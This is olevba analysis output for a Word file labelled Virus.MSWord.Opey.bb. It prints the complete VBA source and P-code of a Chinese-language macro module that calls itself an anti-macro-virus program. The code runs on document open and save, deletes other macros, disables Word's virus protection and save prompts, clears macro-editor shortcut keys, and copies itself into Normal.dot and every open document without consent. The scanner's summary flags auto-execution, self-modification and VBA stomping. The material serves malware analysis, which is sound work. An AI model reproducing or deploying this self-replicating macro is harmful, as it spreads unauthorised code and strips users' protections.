olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Opey.bb
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Opey.bb - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO JiShenhua33.bas 
in file: ./Virus.MSWord.Opey.bb - OLE stream: 'Macros/VBA/JiShenhua33'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' ------------------------------------------------------------------------------------
' 程序设计: 冀慎华  建行山东省分行
' 日期: 2001年3月
' 功能: 该程序把WORD菜单与工具条初始化到原来状态并删除本模块以外的宏模块.
'-------------------------------------------------------------------------------------
Const CurrentVersion = 33 '版本号
Const myName = "JiShenhua33" '本程序名
Sub AutoExec()
On Error Resume Next
    Call Initialize
    Call Immunize
End Sub
Sub autoopen()
On Error Resume Next
   Call Initialize
   Call Immunize
End Sub
Sub FileOpen()
On Error Resume Next
    Call Initialize
    Call Immunize
    Dialogs(wdDialogFileOpen).Show
    Call Immunize
End Sub
Sub filesave()
On Error Resume Next
    Call Initialize
    Call Immunize
    If Not ActiveDocument.saved Then ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
    Call Initialize
    Call Immunize
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Function IsNewDoc(myDoc As Document) As Boolean
    Dim rightPart As String
    If (Left(myDoc.Name, 2) = "文档") Then
        rightPart = Right(myDoc.Name, Len(myDoc.Name) - 2)
        If IsNumeric(rightPart) Then IsNewDoc = True Else IsNewDoc = False
    ElseIf (Left(myDoc.Name, 3) = "Doc") Then
        rightPart = Right(myDoc.Name, Len(myDoc.Name) - 3)
        If IsNumeric(rightPart) Then IsNewDoc = True Else IsNewDoc = False
    Else
        IsNewDoc = False
    End If
End Function
Function Immunize()
On Error Resume Next
    
    Dim ModuleName$, OpenDocImmunized As Boolean
    Dim i%, J%, NmImmunized As Boolean
    Dim myInt As Integer
    Dim openDoc As Document
    
    NmImmunized = False
    For i = NormalTemplate.VBProject.VBComponents.count To 1 Step -1
        ModuleName = NormalTemplate.VBProject.VBComponents(i).Name
        Select Case ModuleName
        Case "ThisDocument"
            myInt = NormalTemplate.VBProject.VBComponents(i).CodeModule.CountOfLines
            If myInt > 0 Then
                NormalTemplate.VBProject.VBComponents(i).CodeModule.DeleteLines 1, myInt
            End If
        Case "MyTools"
        Case "VirusReport", "JiShenhua" '旧版本杀病毒程序
            Application.OrganizerDelete _
                Source:=NormalTemplate.FullName, _
                Name:=ModuleName, _
                Object:=wdOrganizerObjectProjectItems
        Case Else
            If Left(ModuleName, 9) = "JiShenhua" Then '本程序
                myInt = Val(Right(ModuleName, 2))
                If myInt < CurrentVersion Then '当前程序的旧版本
                    Application.OrganizerDelete _
                        Source:=NormalTemplate.FullName, _
                        Name:=ModuleName, _
                        Object:=wdOrganizerObjectProjectItems
                Else
                    NmImmunized = True '是当前版本或更高版本程序
                End If
            Else '其他程序
                msg = "你的 Word 系统中附带有宏程序模块 " + ModuleName + _
                    ", 极有可能是宏病毒,请选择 '是' 清除该病毒."
                If MsgBox(msg, vbYesNo, "冀慎华向您报告:") = vbYes Then
                    Application.OrganizerDelete _
                        Source:=NormalTemplate.FullName, _
                        Name:=ModuleName, _
                        Object:=wdOrganizerObjectProjectItems
                End If
            End If
        End Select
    Next i
    
    For Each openDoc In Documents
        OpenDocImmunized = False
        For J = openDoc.VBProject.VBComponents.count To 1 Step -1
            ModuleName = openDoc.VBProject.VBComponents(J).Name
            Select Case ModuleName
                Case "ThisDocument"
                    myInt = openDoc.VBProject.VBComponents(J).CodeModule.CountOfLines
                    If myInt > 0 Then
                        openDoc.VBProject.VBComponents(J).CodeModule.DeleteLines 1, myInt
                    End If
                Case "Reference to Normal", "MyTools"
                Case "VirusReport", "JiShenhua" '旧版本杀病毒程序
                    Application.OrganizerDelete _
                        Source:=openDoc.FullName, _
                        Name:=ModuleName, _
                        Object:=wdOrganizerObjectProjectItems
                Case Else
                    If Left(ModuleName, 9) = "JiShenhua" Then '本程序
                        myInt = Val(Right(ModuleName, 2))
                        If myInt < CurrentVersion Then '当前程序的旧版本
                            Application.OrganizerDelete _
                                Source:=openDoc.FullName, _
                                Name:=ModuleName, _
                                Object:=wdOrganizerObjectProjectItems
                        Else
                            OpenDocImmunized = True '是当前版本或更高版本程序
                        End If
                    Else '有其他模块存在
                        msg = "您的文件 <" + openDoc.Name + "> 中附带有 Word 宏模块 " + ModuleName + _
                            ", 极有可能是宏病毒,请选择 '是' 清除该病毒."
                        If MsgBox(msg, vbYesNo, "冀慎华向您报告:") = vbYes Then
                            Application.OrganizerDelete _
                                Source:=openDoc.FullName, _
                                Name:=ModuleName, _
                                Object:=wdOrganizerObjectProjectItems
                        End If
                    End If
            End Select
        Next J
        '向打开的文档中写入本程序
        If Not OpenDocImmunized Then
            Application.OrganizerCopy Source:=NormalTemplate.FullName, _
                Destination:=openDoc.FullName, Name:=myName, _
                Object:=wdOrganizerObjectProjectItems
            If (Not IsNewDoc(openDoc)) And (Not openDoc.saved) Then
                openDoc.Save
            End If
        End If
    Next openDoc
    '向Normal中写入本程序
    If Not NmImmunized Then
        Application.OrganizerCopy _
            Source:=ActiveDocument.FullName, _
            Destination:=NormalTemplate.FullName, _
            Name:=myName, _
            Object:=wdOrganizerObjectProjectItems
        If Not NormalTemplate.saved Then NormalTemplate.Save
    End If
End Function
Function Initialize()
On Error Resume Next
   
   Application.DisplayAlerts = wdAlertsAll
   WordBasic.DisableAutoMacros 1
   
    With Application
        .UserAddress = "冀慎华已为您的机器安装了反宏病毒程序(v33),事前未征求您的同意,请见谅."
    End With
    
    With Dialogs(wdDialogFileSummaryInfo)
        .Comments = "该文件附带有冀慎华编写的反宏病毒程序(v33)."
        .Execute
    End With
    
    With Options
        .ConfirmConversions = True
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    
    With ActiveDocument
        .ReadOnlyRecommended = False
    End With
    
   With CommandBars("Visual Basic")
      .Enabled = True
      .Protection = msoBarTypeMenuBar
      .Protection = msoBarMenuBar
   End With
   
   With CommandBars("Tools")
      .Reset
      .Controls("Macro").Reset
      .Controls("Customize...").Reset
   End With
   
   FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Clear
   FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Clear
   CustomizationContext = NormalTemplate
End Function
Sub CheckAllFiles()
    
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Opey.bb
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 935 bytes
' Macros/VBA/JiShenhua33 - 13162 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0055 " ------------------------------------------------------------------------------------"
' Line #1:
' 	QuoteRem 0x0000 0x0021 " 程序设计: 冀慎华  建行山东省分行"
' Line #2:
' 	QuoteRem 0x0000 0x0010 " 日期: 2001年3月"
' Line #3:
' 	QuoteRem 0x0000 0x0048 " 功能: 该程序把WORD菜单与工具条初始化到原来状态并删除本模块以外的宏模块."
' Line #4:
' 	QuoteRem 0x0000 0x0055 "-------------------------------------------------------------------------------------"
' Line #5:
' 	Dim (Const) 
' 	LitDI2 0x0021 
' 	VarDefn CurrentVersion
' 	QuoteRem 0x001A 0x0006 "版本号"
' Line #6:
' 	Dim (Const) 
' 	LitStr 0x000B "JiShenhua33"
' 	VarDefn myName
' 	QuoteRem 0x001D 0x0008 "本程序名"
' Line #7:
' 	FuncDefn (Sub AutoExec())
' Line #8:
' 	OnError (Resume Next) 
' Line #9:
' 	ArgsCall (Call) Initialize 0x0000 
' Line #10:
' 	ArgsCall (Call) Immunize 0x0000 
' Line #11:
' 	EndSub 
' Line #12:
' 	FuncDefn (Sub autoopen())
' Line #13:
' 	OnError (Resume Next) 
' Line #14:
' 	ArgsCall (Call) Initialize 0x0000 
' Line #15:
' 	ArgsCall (Call) Immunize 0x0000 
' Line #16:
' 	EndSub 
' Line #17:
' 	FuncDefn (Sub FileOpen())
' Line #18:
' 	OnError (Resume Next) 
' Line #19:
' 	ArgsCall (Call) Initialize 0x0000 
' Line #20:
' 	ArgsCall (Call) Immunize 0x0000 
' Line #21:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #22:
' 	ArgsCall (Call) Immunize 0x0000 
' Line #23:
' 	EndSub 
' Line #24:
' 	FuncDefn (Sub filesave())
' Line #25:
' 	OnError (Resume Next) 
' Line #26:
' 	ArgsCall (Call) Initialize 0x0000 
' Line #27:
' 	ArgsCall (Call) Immunize 0x0000 
' Line #28:
' 	Ld ActiveDocument 
' 	MemLd saved 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #29:
' 	EndSub 
' Line #30:
' 	FuncDefn (Sub FileSaveAs())
' Line #31:
' 	OnError (Resume Next) 
' Line #32:
' 	ArgsCall (Call) Initialize 0x0000 
' Line #33:
' 	ArgsCall (Call) Immunize 0x0000 
' Line #34:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #35:
' 	EndSub 
' Line #36:
' 	FuncDefn (Function IsNewDoc(myDoc As ) As Boolean)
' Line #37:
' 	Dim 
' 	VarDefn rightPart (As String)
' Line #38:
' 	Ld myDoc 
' 	MemLd New 
' 	LitDI2 0x0002 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0004 "文档"
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #39:
' 	Ld myDoc 
' 	MemLd New 
' 	Ld myDoc 
' 	MemLd New 
' 	FnLen 
' 	LitDI2 0x0002 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	St rightPart 
' Line #40:
' 	Ld rightPart 
' 	ArgsLd IsNumeric 0x0001 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St IsNewDoc 
' 	Else 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St IsNewDoc 
' 	EndIf 
' Line #41:
' 	Ld myDoc 
' 	MemLd New 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Doc"
' 	Eq 
' 	Paren 
' 	ElseIfBlock 
' Line #42:
' 	Ld myDoc 
' 	MemLd New 
' 	Ld myDoc 
' 	MemLd New 
' 	FnLen 
' 	LitDI2 0x0003 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	St rightPart 
' Line #43:
' 	Ld rightPart 
' 	ArgsLd IsNumeric 0x0001 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St IsNewDoc 
' 	Else 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St IsNewDoc 
' 	EndIf 
' Line #44:
' 	ElseBlock 
' Line #45:
' 	LitVarSpecial (False)
' 	St IsNewDoc 
' Line #46:
' 	EndIfBlock 
' Line #47:
' 	EndFunc 
' Line #48:
' 	FuncDefn (Function Immunize())
' Line #49:
' 	OnError (Resume Next) 
' Line #50:
' Line #51:
' 	Dim 
' 	VarDefn ModuleName
' 	VarDefn OpenDocImmunized (As Boolean)
' Line #52:
' 	Dim 
' 	VarDefn i
' 	VarDefn J
' 	VarDefn NmImmunized (As Boolean)
' Line #53:
' 	Dim 
' 	VarDefn myInt (As Integer)
' Line #54:
' 	Dim 
' 	VarDefn openDoc
' Line #55:
' Line #56:
' 	LitVarSpecial (False)
' 	St NmImmunized 
' Line #57:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #58:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St ModuleName 
' Line #59:
' 	Ld ModuleName 
' 	SelectCase 
' Line #60:
' 	LitStr 0x000C "ThisDocument"
' 	Case 
' 	CaseDone 
' Line #61:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St myInt 
' Line #62:
' 	Ld myInt 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #63:
' 	LitDI2 0x0001 
' 	Ld myInt 
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #64:
' 	EndIfBlock 
' Line #65:
' 	LitStr 0x0007 "MyTools"
' 	Case 
' 	CaseDone 
' Line #66:
' 	LitStr 0x000B "VirusReport"
' 	Case 
' 	LitStr 0x0009 "JiShenhua"
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x0028 0x0010 "旧版本杀病毒程序"
' Line #67:
' 	LineCont 0x000C 03 00 10 00 09 00 10 00 0D 00 10 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ModuleName 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #68:
' 	CaseElse 
' Line #69:
' 	Ld ModuleName 
' 	LitDI2 0x0009 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0009 "JiShenhua"
' 	Eq 
' 	IfBlock 
' 	QuoteRem 0x0036 0x0006 "本程序"
' Line #70:
' 	Ld ModuleName 
' 	LitDI2 0x0002 
' 	ArgsLd Right 0x0002 
' 	ArgsLd Val 0x0001 
' 	St myInt 
' Line #71:
' 	Ld myInt 
' 	Ld CurrentVersion 
' 	Lt 
' 	IfBlock 
' 	QuoteRem 0x002F 0x0010 "当前程序的旧版本"
' Line #72:
' 	LineCont 0x000C 03 00 18 00 09 00 18 00 0D 00 18 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ModuleName 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #73:
' 	ElseBlock 
' Line #74:
' 	LitVarSpecial (True)
' 	St NmImmunized 
' 	QuoteRem 0x0027 0x0018 "是当前版本或更高版本程序"
' Line #75:
' 	EndIfBlock 
' Line #76:
' 	ElseBlock 
' 	QuoteRem 0x0011 0x0008 "其他程序"
' Line #77:
' 	LineCont 0x0004 06 00 14 00
' 	LitStr 0x0021 "你的 Word 系统中附带有宏程序模块 "
' 	Ld ModuleName 
' 	Add 
' 	LitStr 0x002A ", 极有可能是宏病毒,请选择 '是' 清除该病毒."
' 	Add 
' 	St msg 
' Line #78:
' 	Ld msg 
' 	Ld vbYesNo 
' 	LitStr 0x000F "冀慎华向您报告:"
' 	ArgsLd MsgBox 0x0003 
' 	Ld vbYes 
' 	Eq 
' 	IfBlock 
' Line #79:
' 	LineCont 0x000C 03 00 18 00 09 00 18 00 0D 00 18 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ModuleName 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #80:
' 	EndIfBlock 
' Line #81:
' 	EndIfBlock 
' Line #82:
' 	EndSelect 
' Line #83:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #84:
' Line #85:
' 	StartForVariable 
' 	Ld openDoc 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #86:
' 	LitVarSpecial (False)
' 	St OpenDocImmunized 
' Line #87:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	Ld openDoc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd count 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	UMi 
' 	ForStep 
' Line #88:
' 	Ld J 
' 	Ld openDoc 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St ModuleName 
' Line #89:
' 	Ld ModuleName 
' 	SelectCase 
' Line #90:
' 	LitStr 0x000C "ThisDocument"
' 	Case 
' 	CaseDone 
' Line #91:
' 	Ld J 
' 	Ld openDoc 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St myInt 
' Line #92:
' 	Ld myInt 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #93:
' 	LitDI2 0x0001 
' 	Ld myInt 
' 	Ld J 
' 	Ld openDoc 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #94:
' 	EndIfBlock 
' Line #95:
' 	LitStr 0x0013 "Reference to Normal"
' 	Case 
' 	LitStr 0x0007 "MyTools"
' 	Case 
' 	CaseDone 
' Line #96:
' 	LitStr 0x000B "VirusReport"
' 	Case 
' 	LitStr 0x0009 "JiShenhua"
' 	Case 
' 	CaseDone 
' 	QuoteRem 0x0030 0x0010 "旧版本杀病毒程序"
' Line #97:
' 	LineCont 0x000C 03 00 18 00 09 00 18 00 0D 00 18 00
' 	Ld openDoc 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ModuleName 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #98:
' 	CaseElse 
' Line #99:
' 	Ld ModuleName 
' 	LitDI2 0x0009 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0009 "JiShenhua"
' 	Eq 
' 	IfBlock 
' 	QuoteRem 0x003E 0x0006 "本程序"
' Line #100:
' 	Ld ModuleName 
' 	LitDI2 0x0002 
' 	ArgsLd Right 0x0002 
' 	ArgsLd Val 0x0001 
' 	St myInt 
' Line #101:
' 	Ld myInt 
' 	Ld CurrentVersion 
' 	Lt 
' 	IfBlock 
' 	QuoteRem 0x0037 0x0010 "当前程序的旧版本"
' Line #102:
' 	LineCont 0x000C 03 00 20 00 09 00 20 00 0D 00 20 00
' 	Ld openDoc 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ModuleName 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #103:
' 	ElseBlock 
' Line #104:
' 	LitVarSpecial (True)
' 	St OpenDocImmunized 
' 	QuoteRem 0x0034 0x0018 "是当前版本或更高版本程序"
' Line #105:
' 	EndIfBlock 
' Line #106:
' 	ElseBlock 
' 	QuoteRem 0x0019 0x000E "有其他模块存在"
' Line #107:
' 	LineCont 0x0004 0C 00 1C 00
' 	LitStr 0x000A "您的文件 <"
' 	Ld openDoc 
' 	MemLd New 
' 	Add 
' 	LitStr 0x0017 "> 中附带有 Word 宏模块 "
' 	Add 
' 	Ld ModuleName 
' 	Add 
' 	LitStr 0x002A ", 极有可能是宏病毒,请选择 '是' 清除该病毒."
' 	Add 
' 	St msg 
' Line #108:
' 	Ld msg 
' 	Ld vbYesNo 
' 	LitStr 0x000F "冀慎华向您报告:"
' 	ArgsLd MsgBox 0x0003 
' 	Ld vbYes 
' 	Eq 
' 	IfBlock 
' Line #109:
' 	LineCont 0x000C 03 00 20 00 09 00 20 00 0D 00 20 00
' 	Ld openDoc 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ModuleName 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #110:
' 	EndIfBlock 
' Line #111:
' 	EndIfBlock 
' Line #112:
' 	EndSelect 
' Line #113:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	NextVar 
' Line #114:
' 	QuoteRem 0x0008 0x0018 "向打开的文档中写入本程序"
' Line #115:
' 	Ld OpenDocImmunized 
' 	Not 
' 	IfBlock 
' Line #116:
' 	LineCont 0x0008 09 00 10 00 13 00 10 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld openDoc 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld myName 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #117:
' 	Ld openDoc 
' 	ArgsLd IsNewDoc 0x0001 
' 	Not 
' 	Paren 
' 	Ld openDoc 
' 	MemLd saved 
' 	Not 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #118:
' 	Ld openDoc 
' 	ArgsMemCall Save 0x0000 
' Line #119:
' 	EndIfBlock 
' Line #120:
' 	EndIfBlock 
' Line #121:
' 	StartForVariable 
' 	Ld openDoc 
' 	EndForVariable 
' 	NextVar 
' Line #122:
' 	QuoteRem 0x0004 0x0014 "向Normal中写入本程序"
' Line #123:
' 	Ld NmImmunized 
' 	Not 
' 	IfBlock 
' Line #124:
' 	LineCont 0x0010 03 00 0C 00 09 00 0C 00 0F 00 0C 00 13 00 0C 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld myName 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #125:
' 	Ld NormalTemplate 
' 	MemLd saved 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #126:
' 	EndIfBlock 
' Line #127:
' 	EndFunc 
' Line #128:
' 	FuncDefn (Function Initialize())
' Line #129:
' 	OnError (Resume Next) 
' Line #130:
' Line #131:
' 	Ld wdAlertsAll 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #132:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #133:
' Line #134:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #135:
' 	LitStr 0x0044 "冀慎华已为您的机器安装了反宏病毒程序(v33),事前未征求您的同意,请见谅."
' 	MemStWith UserAddress 
' Line #136:
' 	EndWith 
' Line #137:
' Line #138:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #139:
' 	LitStr 0x002A "该文件附带有冀慎华编写的反宏病毒程序(v33)."
' 	MemStWith Comments 
' Line #140:
' 	ArgsMemCallWith Execute 0x0000 
' Line #141:
' 	EndWith 
' Line #142:
' Line #143:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #144:
' 	LitVarSpecial (True)
' 	MemStWith ConfirmConversions 
' Line #145:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #146:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #147:
' 	EndWith 
' Line #148:
' Line #149:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #150:
' 	LitVarSpecial (False)
' 	MemStWith ReadOnlyRecommended 
' Line #151:
' 	EndWith 
' Line #152:
' Line #153:
' 	StartWithExpr 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	With 
' Line #154:
' 	LitVarSpecial (True)
' 	MemStWith Enabled 
' Line #155:
' 	Ld msoBarTypeMenuBar 
' 	MemStWith Protection 
' Line #156:
' 	Ld msoBarMenuBar 
' 	MemStWith Protection 
' Line #157:
' 	EndWith 
' Line #158:
' Line #159:
' 	StartWithExpr 
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	With 
' Line #160:
' 	ArgsMemCallWith Reset 0x0000 
' Line #161:
' 	LitStr 0x0005 "Macro"
' 	ArgsMemLdWith Controls 0x0001 
' 	ArgsMemCall Reset 0x0000 
' Line #162:
' 	LitStr 0x000C "Customize..."
' 	ArgsMemLdWith Controls 0x0001 
' 	ArgsMemCall Reset 0x0000 
' Line #163:
' 	EndWith 
' Line #164:
' Line #165:
' 	Ld wdKeyF11 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Clear 0x0000 
' Line #166:
' 	Ld wdKeyF8 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Clear 0x0000 
' Line #167:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #168:
' 	EndFunc 
' Line #169:
' 	FuncDefn (Sub CheckAllFiles())
' Line #170:
' Line #171:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |autoopen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

